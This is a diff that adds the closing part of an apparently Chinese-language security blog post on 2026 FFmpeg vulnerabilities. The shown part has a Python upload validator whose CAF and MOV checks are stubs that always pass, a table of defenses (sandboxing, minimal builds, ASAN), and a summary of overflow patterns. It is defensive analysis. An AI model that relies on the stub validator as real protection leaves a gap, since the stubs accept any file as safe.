+        <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;CAF validation passed&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_validate_mov</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">header</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;校验MOV/MP4文件&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;MOV validation passed&quot;</span>
+
+
+<span class="c1"># 使用示例</span>
+<span class="n">validator</span> <span class="o">=</span> <span class="n">MediaFileValidator</span><span class="p">()</span>
+<span class="n">is_safe</span><span class="p">,</span> <span class="n">message</span> <span class="o">=</span> <span class="n">validator</span><span class="o">.</span><span class="n">validate_file</span><span class="p">(</span><span class="s2">&quot;/tmp/uploaded_video.avi&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[BLOCKED] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="c1"># 拒绝处理该文件</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[OK] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="c1"># 继续处理</span>
+</code></pre></div>
+
+<h3>8.6 防御措施总结</h3>
+<table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>措施</th>
+<th>针对漏洞</th>
+<th>优先级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级修复</td>
+<td>使用FFmpeg git master (含所有修复)</td>
+<td>全部</td>
+<td>高</td>
+</tr>
+<tr>
+<td>最小化编译</td>
+<td>禁用不需要的解码器/滤镜</td>
+<td>CVE-2026-8461, 66036, 66039</td>
+<td>高</td>
+</tr>
+<tr>
+<td>沙箱隔离</td>
+<td>bwrap命名空间 + seccomp系统调用过滤</td>
+<td>全部</td>
+<td>高</td>
+</tr>
+<tr>
+<td>ASAN检测</td>
+<td>ASAN编译版处理用户上传</td>
+<td>全部</td>
+<td>高</td>
+</tr>
+<tr>
+<td>编译加固</td>
+<td>Stack Canary + FORTIFY + PIE + RELRO</td>
+<td>全部</td>
+<td>中</td>
+</tr>
+<tr>
+<td>输入校验</td>
+<td>预校验文件格式和编解码器</td>
+<td>CVE-2026-8461, 66039</td>
+<td>中</td>
+</tr>
+<tr>
+<td>超时限制</td>
+<td>限制FFmpeg处理时间</td>
+<td>DoS类漏洞</td>
+<td>中</td>
+</tr>
+<tr>
+<td>文件大小限制</td>
+<td>限制上传文件大小</td>
+<td>CVE-2026-66037</td>
+<td>低</td>
+</tr>
+<tr>
+<td>监控告警</td>
+<td>监控FFmpeg进程崩溃和异常退出</td>
+<td>全部</td>
+<td>低</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>9. 总结</h2>
+<p>FFmpeg在2026年披露的漏洞系列（PixelSmash + 六个高危漏洞）再次证明了多媒体处理框架作为安全攻击面的严重性。这些漏洞的共同模式值得深入理解：</p>
+<p><strong>整数溢出模式</strong>：CVE-2026-8461（色度平面高度计算不一致）、CVE-2026-66039（MACE6有符号整数溢出）、CVE-2026-30999（MOV CENC整数溢出）都源于对攻击者控制的尺寸/计数字段缺乏溢出检查。在C语言中，整数运算的溢出行为（无符号回绕、有符号未定义）是内存破坏漏洞的最常见根因之一。</p>
+<p><strong>缓冲区尺寸不匹配模式</strong>：CVE-2026-8461中帧分配器和解码器使用不同的计算逻辑确定色度平面高度，CVE-2026-66036中滤镜初始化时的缓冲区大小与后续帧的实际尺寸不匹配。这类问题的本质是不同组件对同一概念（如"高度"）的语义理解不一致。</p>
+<p><strong>供应链放大效应</strong>：FFmpeg的一个漏洞会影响所有链接它的下游项目——Jellyfin、Plex、VLC、mpv、GNOME缩略图生成器等数百个项目。这些项目本身没有引入漏洞，却通过依赖继承了一切风险。PixelSmash在Jellyfin上的RCE演示清楚地表明，上传一个50KB的AVI文件就足以让整个媒体服务器沦陷。</p>
+<p>从防御角度，最有效的措施是<strong>最小化编译</strong>——禁用不需要的解码器和滤镜。如果应用不需要处理MagicYUV视频，就没有理由在构建中包含它的解码器。FFmpeg支持数百种编解码器，但大多数应用只需要其中一小部分。通过<code>--disable-everything</code>然后按需<code>--enable</code>的方式构建，可以大幅减少攻击面。</p>
+<p>其次是<strong>沙箱隔离</strong>。处理用户上传的媒体文件时，应将FFmpeg运行在bwrap命名空间和seccomp过滤器中，限制其文件系统访问和网络通信。即使FFmpeg被攻破，攻击者也无法直接访问宿主系统。</p>
+<p>最后，<strong>ASAN编译版</strong>应该成为处理不可信输入的标准配置。虽然ASAN会带来约2倍的性能开销，但它能在内存错误发生的瞬间终止进程并生成详细报告，将潜在的安全漏洞转化为可控的崩溃——这比让漏洞在暗中存在要好得多。</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用，文中涉及的漏洞分析、PoC代码和攻击技术仅用于授权测试和安全防御建设。读者应遵守所在地区的法律法规，未经授权不得对任何系统进行渗透测试或攻击。因不当使用本文内容所造成的任何后果，作者不承担任何责任。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
